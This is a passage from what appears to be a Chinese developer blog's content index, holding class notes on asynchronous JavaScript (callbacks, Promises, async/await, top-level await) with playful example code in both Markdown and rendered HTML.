回调\n\n小心**回调地狱**\n\n回调函数不断嵌套，导致代码可读性大幅下降\n\n~~~javascript\nsetTimeout(function () {\n  console.log(\"超哥起床\");\n  if(超哥睡回笼觉==true){\n  setTimeout(function(){\n       console.log(\"超哥回到床上超哥睡觉)\n  },500)\n  else(超哥睡回笼觉==false){\n   setTimeout(function () {\n    console.log(\"超哥刷牙\");\n    setTimeout(function () {\n      console.log(\"超哥洗脸\");\n      setTimeout(function () {\n        超哥上厕所;\n      }, 3000);\n    }, 500);\n  }, 500);\n  }\n}, 500);\n~~~\n\n### Promise\n\n> Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等\n\n使用Promise进行异步操作会提高代码可读性 （摆脱回调地狱）\n\n#### then/catch 链式调用\n\n用法类似Java的CompletableFuture，进行链式调用，可以传参。\n\n不一样的是多了一个异常处理的回调，个人感觉比CompletableFuture好使。\n\n~~~javascript\nlet p = new Promise((resolve, reject) => {\n    //做一些异步操作\n    setTimeout(() => {\n        console.log('执行完成');\n       if （我找到对象了==true）resolve(\"好耶\");\n       else reject(\"也许你可以把标准放开一点\")\n    }, 2000);\n}).then((data)=>{\n     console.log(data)\n     return data\n     //此时输出data为resolve传入的参数\n},(error)=>{\n     console.log(error)\n     //此时输出error为reject传入的参数\n}).then((data)=>{\n   console.log(data)\n   return data \n   //好耶\n}).then((data)=>{\n   console.log(data)\n   //好耶\n}).then((data)=>{\n   console.log(data)\n   //undefined\n}).catch((error)=>{\n    console.log(data)\n})\n~~~\n\n#### all/race 多个异步操作的同步处理\n\n- all 全部任务执行完毕后执行下一个任务\n\n  >Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。\n\n  ~~~javascript\n  let Promise1 = new Promise(function(resolve, reject){})\n  let Promise2 = new Promise(function(resolve, reject){})\n  let Promise3 = new Promise(function(resolve, reject){})\n  \n  let p = Promise.all([Promise1, Promise2, Promise3])\n  \n  p.then(funciton(){\n    // 三个都成功则成功  \n  }, function(){\n    // 只要有失败，则失败 \n  })\n  ~~~\n\n- race 多个任务进行比赛\n\n  ***我选择最快的那个！***\n\n  > race方法传入多个promise参数，返回值为其中最快执行完成的promise\n\n  ~~~javascript\n   //请求某个图片资源\n      function requestImg(){\n          var p = new Promise((resolve, reject) => {\n              var img = new Image();\n              img.onload = function(){\n                  resolve(img);\n              }\n              img.src = '图片的路径';\n          });\n          return p;\n      }\n      //延时函数，用于给请求计时\n      function timeout(){\n          var p = new Promise((resolve, reject) => {\n              setTimeout(() => {\n                  reject('图片请求超时');\n              }, 5000);\n          });\n          return p;\n      }\n      Promise.race([requestImg(), timeout()]).then((data) =>{\n          console.log(data);\n      }).catch((err) => {\n          console.log(err);\n      });\n  ~~~\n\n### async/await\n\n实际上他们是基于promise实现的，它们的作用就是让你异步执行的代码同步\n\n> async用来修饰一个方法，在async修饰的方法中可以使用await来修饰一个方法的调用。\n>\n> 有点类似于kotlin协程中的suspend 挂起函数 与 Deffered#await方法\n>\n> 但js可没有什么乱七八糟的协程作用域和上下文，毕竟这些实际上都是在单线程环境下运行的\n\n**举个栗子**\n\n~~~javascript\n// await修饰符只能影响像这样返回一个promise的函数和被async修饰的函数\nconst step = (size, time, ele) => {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            ele.style.marginLeft = `${size}px`\n            resolve(size)\n        }, time)\n    })\n}\n\n// 这里await会让原本异步的方法同步，也就是这里step方法彻底执行完毕才会进入下一次循环\nasync function asyncAnimation(id) {\n    const ele = document.getElementById(id)\n    for (let i = 1; i <= 200; i++) {\n        await step(i + 100, 10, ele)\n    }\n}\n\n// 顺序执行任务队列\n// 让异步队列同步执行\nasync function awaitAll() {\n    await asyncAnimation(\"one\")\n    await asyncAnimation(\"two\")\n    await asyncAnimation(\"three\")\n}\n\nawaitAll()\n~~~\n\n#### 一点小彩蛋\n\n##### top await\n\n来自路姐姐的指导（\n\n> 在引用时加一串type=\"module\" \n>\n> 可以导入JS模块（下学期内容），还可以使用一些其他JS的新特性，比如 top await，这时 await 就不需要放在 async 函数里才能执行了\n>\n> 路姐的优雅代码 彳亍\n\n~~~html\n<script src=\"optimize/script.js\" type=\"module\" defer></script>\n~~~\n\n然后就可以直接在外部调用await\n\n让我们看看路姐的优雅のcode\n\n~~~javascript\nconst p = document.querySelector('p')\nconst content = `元丰六年十月十二日夜，解衣欲睡，月色入户\n，欣然起行。念无与为乐者，遂至承天寺寻张怀民。怀民亦未寝，相与步于中庭。\n庭下如积水空明，水中藻、荇交横，盖竹柏影也。何夜无月？何处无竹柏？但少闲人如吾两人者耳。\n`\n\n// 这个函数可以达到类似Java在子线程中调用Thread.sleep的效果\nasync function sleep(ms) {\n    return new Promise(resolve => {\n        setTimeout(() => resolve(), ms)\n    })\n}\n\nfor (let i = 0; i < content.length; i++) {\n    p.textContent = content.substring(0, i)\n    await sleep(200)\n}\n~~~\n\n这样写就非常彳亍了\n\n##### css自带的动画\n\n~~~css\n.circle {\n    width: 100px;\n    height: 100px;\n    border-radius: 100%;\n    transition: all 1s;\n}\n\n.circle.at-end {\n    transform: translateX(200px);\n}\n~~~\n\ntransition: all 1s; 被加上了这一条，位置的改变会有一个丝滑的动画，而1s这个参数决定了移动的时间。\n","source":"_posts/async-javascript.md","raw":"---\ntitle: 对异步概念上的理解以及JavaScript异步操作实现方式\ndate: 2021-11-29\nauthor: 寒雨\nhide: false\nsummary: 今天红岩前端上课的笔记\ncategories: 笔记\ntags:\n  - javascript\n  - 知识梳理\n---\n\n# 对异步概念上的理解\n\n> 对异步这个单词我早已不陌生了，从去年开始做bukkit开发开始就一直在接触这个词。然而我却从来没有真正理解过异步的含义，之前我实际上是把多线程与异步混淆了。异步操作实际上是完全可以在单线程上执行的\n\n## 什么是异步？\n\n很简单，正所谓**连续**的操作就叫**同步**，**不连续**的操作就叫**异步**。\n\n这样一看，就很好理解了。在多线程的执行环境中，我们启动一个子线程，这个子线程是**串行**执行的，自然是不连续的。\n\n那么单线程中的异步操作时怎么实现的？\n\n答案是，先执行完同步代码，最后逐个执行异步队列中的回调函数。\n\n例如javascript中的异步 （单线程）\n\n~~~javascript\nconsole.log(\"Hello\")\n// 最后执行\nsetTimeout(() => {\n   // 操作\n   console.log(\"Hello World\")\n}, 500)\nconsole.log(\"World\")\n~~~\n\n输出结果:\n\n~~~\nHello\nWorld\nHello World\n~~~\n\n## JavaScript中的异步实现方式\n\n> JavaScript中的异步除了Web Worker均为单线程实现\n\n### 回调\n\n小心**回调地狱**\n\n回调函数不断嵌套，导致代码可读性大幅下降\n\n~~~javascript\nsetTimeout(function () {\n  console.log(\"超哥起床\");\n  if(超哥睡回笼觉==true){\n  setTimeout(function(){\n       console.log(\"超哥回到床上超哥睡觉)\n  },500)\n  else(超哥睡回笼觉==false){\n   setTimeout(function () {\n    console.log(\"超哥刷牙\");\n    setTimeout(function () {\n      console.log(\"超哥洗脸\");\n      setTimeout(function () {\n        超哥上厕所;\n      }, 3000);\n    }, 500);\n  }, 500);\n  }\n}, 500);\n~~~\n\n### Promise\n\n> Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等\n\n使用Promise进行异步操作会提高代码可读性 （摆脱回调地狱）\n\n#### then/catch 链式调用\n\n用法类似Java的CompletableFuture，进行链式调用，可以传参。\n\n不一样的是多了一个异常处理的回调，个人感觉比CompletableFuture好使。\n\n~~~javascript\nlet p = new Promise((resolve, reject) => {\n    //做一些异步操作\n    setTimeout(() => {\n        console.log('执行完成');\n       if （我找到对象了==true）resolve(\"好耶\");\n       else reject(\"也许你可以把标准放开一点\")\n    }, 2000);\n}).then((data)=>{\n     console.log(data)\n     return data\n     //此时输出data为resolve传入的参数\n},(error)=>{\n     console.log(error)\n     //此时输出error为reject传入的参数\n}).then((data)=>{\n   console.log(data)\n   return data \n   //好耶\n}).then((data)=>{\n   console.log(data)\n   //好耶\n}).then((data)=>{\n   console.log(data)\n   //undefined\n}).catch((error)=>{\n    console.log(data)\n})\n~~~\n\n#### all/race 多个异步操作的同步处理\n\n- all 全部任务执行完毕后执行下一个任务\n\n  >Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。\n\n  ~~~javascript\n  let Promise1 = new Promise(function(resolve, reject){})\n  let Promise2 = new Promise(function(resolve, reject){})\n  let Promise3 = new Promise(function(resolve, reject){})\n  \n  let p = Promise.all([Promise1, Promise2, Promise3])\n  \n  p.then(funciton(){\n    // 三个都成功则成功  \n  }, function(){\n    // 只要有失败，则失败 \n  })\n  ~~~\n\n- race 多个任务进行比赛\n\n  ***我选择最快的那个！***\n\n  > race方法传入多个promise参数，返回值为其中最快执行完成的promise\n\n  ~~~javascript\n   //请求某个图片资源\n      function requestImg(){\n          var p = new Promise((resolve, reject) => {\n              var img = new Image();\n              img.onload = function(){\n                  resolve(img);\n              }\n              img.src = '图片的路径';\n          });\n          return p;\n      }\n      //延时函数，用于给请求计时\n      function timeout(){\n          var p = new Promise((resolve, reject) => {\n              setTimeout(() => {\n                  reject('图片请求超时');\n              }, 5000);\n          });\n          return p;\n      }\n      Promise.race([requestImg(), timeout()]).then((data) =>{\n          console.log(data);\n      }).catch((err) => {\n          console.log(err);\n      });\n  ~~~\n\n### async/await\n\n实际上他们是基于promise实现的，它们的作用就是让你异步执行的代码同步\n\n> async用来修饰一个方法，在async修饰的方法中可以使用await来修饰一个方法的调用。\n>\n> 有点类似于kotlin协程中的suspend 挂起函数 与 Deffered#await方法\n>\n> 但js可没有什么乱七八糟的协程作用域和上下文，毕竟这些实际上都是在单线程环境下运行的\n\n**举个栗子**\n\n~~~javascript\n// await修饰符只能影响像这样返回一个promise的函数和被async修饰的函数\nconst step = (size, time, ele) => {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            ele.style.marginLeft = `${size}px`\n            resolve(size)\n        }, time)\n    })\n}\n\n// 这里await会让原本异步的方法同步，也就是这里step方法彻底执行完毕才会进入下一次循环\nasync function asyncAnimation(id) {\n    const ele = document.getElementById(id)\n    for (let i = 1; i <= 200; i++) {\n        await step(i + 100, 10, ele)\n    }\n}\n\n// 顺序执行任务队列\n// 让异步队列同步执行\nasync function awaitAll() {\n    await asyncAnimation(\"one\")\n    await asyncAnimation(\"two\")\n    await asyncAnimation(\"three\")\n}\n\nawaitAll()\n~~~\n\n#### 一点小彩蛋\n\n##### top await\n\n来自路姐姐的指导（\n\n> 在引用时加一串type=\"module\" \n>\n> 可以导入JS模块（下学期内容），还可以使用一些其他JS的新特性，比如 top await，这时 await 就不需要放在 async 函数里才能执行了\n>\n> 路姐的优雅代码 彳亍\n\n~~~html\n<script src=\"optimize/script.js\" type=\"module\" defer></script>\n~~~\n\n然后就可以直接在外部调用await\n\n让我们看看路姐的优雅のcode\n\n~~~javascript\nconst p = document.querySelector('p')\nconst content = `元丰六年十月十二日夜，解衣欲睡，月色入户\n，欣然起行。念无与为乐者，遂至承天寺寻张怀民。怀民亦未寝，相与步于中庭。\n庭下如积水空明，水中藻、荇交横，盖竹柏影也。何夜无月？何处无竹柏？但少闲人如吾两人者耳。\n`\n\n// 这个函数可以达到类似Java在子线程中调用Thread.sleep的效果\nasync function sleep(ms) {\n    return new Promise(resolve => {\n        setTimeout(() => resolve(), ms)\n    })\n}\n\nfor (let i = 0; i < content.length; i++) {\n    p.textContent = content.substring(0, i)\n    await sleep(200)\n}\n~~~\n\n这样写就非常彳亍了\n\n##### css自带的动画\n\n~~~css\n.circle {\n    width: 100px;\n    height: 100px;\n    border-radius: 100%;\n    transition: all 1s;\n}\n\n.circle.at-end {\n    transform: translateX(200px);\n}\n~~~\n\ntransition: all 1s; 被加上了这一条，位置的改变会有一个丝滑的动画，而1s这个参数决定了移动的时间。\n","slug":"async-javascript","published":1,"updated":"2022-11-24T03:04:31.938Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt20009sfklau6n5ido","content":"<h1 id=\"对异步概念上的理解\"><a href=\"#对异步概念上的理解\" class=\"headerlink\" title=\"对异步概念上的理解\"></a>对异步概念上的理解</h1><blockquote>\n<p>对异步这个单词我早已不陌生了，从去年开始做bukkit开发开始就一直在接触这个词。然而我却从来没有真正理解过异步的含义，之前我实际上是把多线程与异步混淆了。异步操作实际上是完全可以在单线程上执行的</p>\n</blockquote>\n<h2 id=\"什么是异步？\"><a href=\"#什么是异步？\" class=\"headerlink\" title=\"什么是异步？\"></a>什么是异步？</h2><p>很简单，正所谓<strong>连续</strong>的操作就叫<strong>同步</strong>，<strong>不连续</strong>的操作就叫<strong>异步</strong>。</p>\n<p>这样一看，就很好理解了。在多线程的执行环境中，我们启动一个子线程，这个子线程是<strong>串行</strong>执行的，自然是不连续的。</p>\n<p>那么单线程中的异步操作时怎么实现的？</p>\n<p>答案是，先执行完同步代码，最后逐个执行异步队列中的回调函数。</p>\n<p>例如javascript中的异步 （单线程）</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 最后执行</span>\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token comment\">// 操作</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>输出结果:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Hello\nWorld\nHello World<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"JavaScript中的异步实现方式\"><a href=\"#JavaScript中的异步实现方式\" class=\"headerlink\" title=\"JavaScript中的异步实现方式\"></a>JavaScript中的异步实现方式</h2><blockquote>\n<p>JavaScript中的异步除了Web Worker均为单线程实现</p>\n</blockquote>\n<h3 id=\"回调\"><a href=\"#回调\" class=\"headerlink\" title=\"回调\"></a>回调</h3><p>小心<strong>回调地狱</strong></p>\n<p>回调函数不断嵌套，导致代码可读性大幅下降</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥起床\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>超哥睡回笼觉<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>\"超哥回到床上超哥睡觉<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span>超哥睡回笼觉<span class=\"token operator\">==</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n   <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥刷牙\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥洗脸\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        超哥上厕所<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等</p>\n</blockquote>\n<p>使用Promise进行异步操作会提高代码可读性 （摆脱回调地狱）</p>\n<h4 id=\"then-x2F-catch-链式调用\"><a href=\"#then-x2F-catch-链式调用\" class=\"headerlink\" title=\"then/catch 链式调用\"></a>then/catch 链式调用</h4><p>用法类似Java的CompletableFuture，进行链式调用，可以传参。</p>\n<p>不一样的是多了一个异常处理的回调，个人感觉比CompletableFuture好使。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//做一些异步操作</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'执行完成'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">if</span> （我找到对象了<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token function\">）resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"好耶\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">else</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"也许你可以把标准放开一点\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">return</span> data\n     <span class=\"token comment\">//此时输出data为resolve传入的参数</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n     <span class=\"token comment\">//此时输出error为reject传入的参数</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span> data \n   <span class=\"token comment\">//好耶</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//好耶</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//undefined</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"all-x2F-race-多个异步操作的同步处理\"><a href=\"#all-x2F-race-多个异步操作的同步处理\" class=\"headerlink\" title=\"all/race 多个异步操作的同步处理\"></a>all/race 多个异步操作的同步处理</h4><ul>\n<li><p>all 全部任务执行完毕后执行下一个任务</p>\n<blockquote>\n<p>Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> Promise1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>Promise1<span class=\"token punctuation\">,</span> Promise2<span class=\"token punctuation\">,</span> Promise3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token function\">funciton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// 三个都成功则成功  </span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// 只要有失败，则失败 </span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>race 多个任务进行比赛</p>\n<p><em><strong>我选择最快的那个！</strong></em></p>\n<blockquote>\n<p>race方法传入多个promise参数，返回值为其中最快执行完成的promise</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//请求某个图片资源</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n           <span class=\"token keyword\">var</span> img <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Image</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           img<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n               <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">}</span>\n           img<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">'图片的路径'</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token comment\">//延时函数，用于给请求计时</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n           <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n               <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">'图片请求超时'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">}</span><span class=\"token 